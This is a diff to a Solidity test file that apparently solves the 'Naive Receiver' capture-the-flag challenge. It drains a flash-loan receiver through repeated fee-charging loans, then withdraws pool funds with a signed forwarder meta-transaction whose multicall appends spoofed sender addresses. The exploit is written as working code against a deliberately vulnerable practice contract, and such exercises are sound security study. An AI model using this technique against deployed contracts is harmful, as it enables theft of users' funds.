@@ -77,7 +77,48 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        bytes[] memory multicallData = new bytes[](2);
+        multicallData[0] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_POOL, payable(recovery))
+            ),
+            deployer
+        );
+    
+        multicallData[1] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_RECEIVER, payable(recovery))
+            ),
+            pool.feeReceiver()
+        );
+    
+        // Prepare the forwarder request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 500000,
+            nonce: forwarder.nonces(player),
+            data: abi.encodeCall(Multicall.multicall, (multicallData)),
+            deadline: block.timestamp + 1 hours
+        });
+    
+        // Calculate the request hash
+        bytes32 digest = forwarder.getDataHash(request);
+    
+        digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), digest));
         
+        // Sign the request
+        (uint8 v,  bytes32 r,  bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        Attacker attacker = new Attacker(pool, receiver, forwarder);
+        attacker.saveguardFunds(signature, request);
+
+
     }
 
     /**
@@ -95,5 +136,29 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+}
+
+
+contract Attacker {
+
+    NaiveReceiverPool immutable private pool;
+    FlashLoanReceiver immutable private receiver;
+    BasicForwarder immutable private forwarder;
+
+    constructor(NaiveReceiverPool _pool, FlashLoanReceiver _receiver, BasicForwarder _forwarder) {
+        pool = _pool;
+        receiver = _receiver;
+        forwarder = _forwarder;
+    }
+
+    function saveguardFunds(bytes memory signature, BasicForwarder.Request memory request) external {
+        
+        while(pool.weth().balanceOf(address(receiver)) > 0) {
+            pool.flashLoan(receiver, address(pool.weth()), 0, "");
+        }
+    
+        // Execute the forwarder request
+        forwarder.execute(request, signature);
     }
 }
